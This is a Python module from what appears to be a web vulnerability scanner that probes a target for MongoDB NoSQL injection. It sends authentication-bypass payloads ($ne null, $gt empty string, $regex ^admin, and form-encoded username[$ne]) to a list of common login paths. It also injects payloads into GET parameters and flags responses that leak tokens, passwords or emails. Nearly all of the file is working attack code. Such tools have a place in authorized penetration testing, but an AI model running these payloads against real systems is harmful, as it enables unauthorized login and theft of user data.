"""NoSQL Injection — MongoDB $gt/$ne/$where"""
from core.config import NOSQL_PAYLOADS, NOSQL_PARAMS, R, R2, B, B2, W, Y, G, D, N
from core.engine import http_get, http_post, save_report, vuln
import urllib.parse

LOGIN_PATHS = ["/api/auth/login", "/api/login", "/auth/login", "/login",
               "/api/user/login", "/api/signin", "/signin"]

def run(target):
    print(f"\n{B2}  NoSQL injection test on {W}{target}{N}")
    vulns = 0; findings = []

    # GET-based NoSQL injection
    print(f"\n{D}  Testing GET NoSQL injection...{N}")
    for path in ["/api/users", "/api/user", "/api/search", "/api/products", "/api/data"]:
        for param in NOSQL_PARAMS[:6]:
            for payload in NOSQL_PAYLOADS[:4]:
                encoded = urllib.parse.quote(payload)
                url = f"{target}{path}?{param}={encoded}"
                code, hdrs, body = http_get(url, timeout=7)
                if code == 0: continue
                if code == 200 and len(body) > 200:
                    if any(m in body for m in ["_id","ObjectId","password","email","token"]):
                        vuln("CRITICAL", f"NoSQL injection via ?{param}=", f"Data leaked", url)
                        vulns += 1; findings.append({"type":"nosql_get","param":param,"url":url})
                        break

    # POST-based NoSQL injection (login bypass)
    print(f"\n{D}  Testing POST login bypass...{N}")
    for path in LOGIN_PATHS:
        url = target + path
        # Test 1: $ne null bypass
        payload1 = '{"username":{"$ne":null},"password":{"$ne":null}}'
        code, body = http_post(url, payload1, timeout=8)
        if code in (200, 201, 302):
            if any(m in body.lower() for m in ["token","success","welcome","dashboard","jwt","session"]):
                vuln("CRITICAL", f"NoSQL login bypass!", "$ne:null auth bypass", url)
                vulns += 1; findings.append({"type":"nosql_login_bypass","url":url,"payload":payload1})

        # Test 2: $gt bypass
        payload2 = '{"username":{"$gt":""},"password":{"$gt":""}}'
        code, body = http_post(url, payload2, timeout=8)
        if code in (200, 201, 302):
            if any(m in body.lower() for m in ["token","success","welcome","jwt"]):
                vuln("CRITICAL", f"NoSQL login bypass ($gt)!", url)
                vulns += 1; findings.append({"type":"nosql_login_gt","url":url})

        # Test 3: $regex bypass
        payload3 = '{"username":{"$regex":"^admin"},"password":{"$ne":null}}'
        code, body = http_post(url, payload3, timeout=8)
        if code in (200, 201, 302):
            if any(m in body.lower() for m in ["token","success","admin"]):
                vuln("CRITICAL", f"NoSQL admin bypass ($regex)!", url)
                vulns += 1; findings.append({"type":"nosql_admin_bypass","url":url})

    # Form-encoded NoSQL injection
    print(f"\n{D}  Testing form-encoded NoSQL...{N}")
    for path in LOGIN_PATHS[:3]:
        url = target + path
        form = "username[$ne]=null&password[$ne]=null"
        code, body = http_post(url, form, ctype="application/x-www-form-urlencoded", timeout=8)
        if code in (200, 201, 302):
            if any(m in body.lower() for m in ["token","success","welcome"]):
                vuln("CRITICAL", "Form-encoded NoSQL bypass!", url)
                vulns += 1; findings.append({"type":"nosql_form","url":url})

    print(f"\n{G}  [✓] NoSQL scan done — {vulns} findings{N}")
    if findings: save_report("nosql_inject", {"target":target,"findings":findings})
    return vulns
